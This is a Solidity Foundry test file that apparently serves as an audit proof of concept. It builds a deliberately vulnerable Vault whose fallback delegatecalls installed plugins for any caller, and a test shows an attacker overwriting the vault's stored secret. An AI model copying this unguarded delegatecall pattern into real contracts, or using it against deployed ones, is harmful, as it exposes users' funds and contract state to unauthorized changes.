// Minimal vulnerable replica (inline — do NOT import from ../src/)
contract Vault {
    address public owner;     // slot 0
    uint256 public secret;    // slot 1 (we will target this via delegatecall)
    uint256 public nonce;
    mapping(bytes4 => address) public methods;
    uint256 private constant MIN_GAS_RESERVE = 5000;

    function init() external {
        require(nonce == 0, "Initialized");
        nonce = 1;
        owner = msg.sender;
    }

    // fallback receives the whole calldata as _data and uses msg.sig to lookup plugin
    fallback(bytes calldata _data) external payable returns (bytes memory response) {
        address plugin = methods[msg.sig];
        ( , response) = _execute(plugin, _data);
    }

    function install(bytes4[] memory _selectors, address[] memory _plugins) external {
        require(owner == msg.sender, "NotOwner");
        for (uint i = 0; i < _selectors.length; i++) {
            methods[_selectors[i]] = _plugins[i];
        }
    }

    function _execute(address _target, bytes calldata _data)
        internal
        returns (bool success, bytes memory response)
    {
        uint256 codeSize;
        assembly { codeSize := extcodesize(_target) }
        require(codeSize != 0, "TargetInvalid");

        address owner_ = owner;
        uint256 stipend = gasleft() - MIN_GAS_RESERVE;

        (success, response) = _target.delegatecall{gas: stipend}(_data);
        require(owner_ == owner, "OwnerChanged");
        require(success, "ExecutionReverted");
    }
}

// Plugin designed to modify slot 1 (secret). Storage layout matches Vault: owner, secret
contract Plugin {
    address public owner;
    uint256 public secret;

    function setSecret(uint256 _v) external {
        // This will write to the calling contract's slot 1 because of delegatecall
        secret = _v;
    }
}

contract VaultTest is Test {
    Vault target;
    Plugin plugin;
    address attacker;
    address ownerAddr;

    function setUp() public {
        target = new Vault();
        plugin = new Plugin();
        attacker = makeAddr("attacker");
        ownerAddr = makeAddr("owner");

        // initialize vault owner
        vm.prank(ownerAddr);
        target.init();

        // owner installs plugin for selector setSecret(uint256)
        bytes4 sel = bytes4(keccak256("setSecret(uint256)"));
        bytes4[] memory sels = new bytes4[](1);
        sels[0] = sel;
        address[] memory plugs = new address[](1);
        plugs[0] = address(plugin);
        vm.prank(ownerAddr);
        target.install(sels, plugs);
    }

    function test_attacker_exploits_fallback() public {
        bytes4 sel = bytes4(keccak256("setSecret(uint256)"));
        // Attacker calls the vault with calldata for setSecret — fallback will delegatecall plugin
        vm.prank(attacker);
        (bool ok, ) = address(target).call(abi.encodeWithSelector(sel, 0xBEEF));
        require(ok, "call failed");

        // secret was written in Vault's storage by the plugin via delegatecall
        assertEq(target.secret(), 0xBEEF);
    }
}

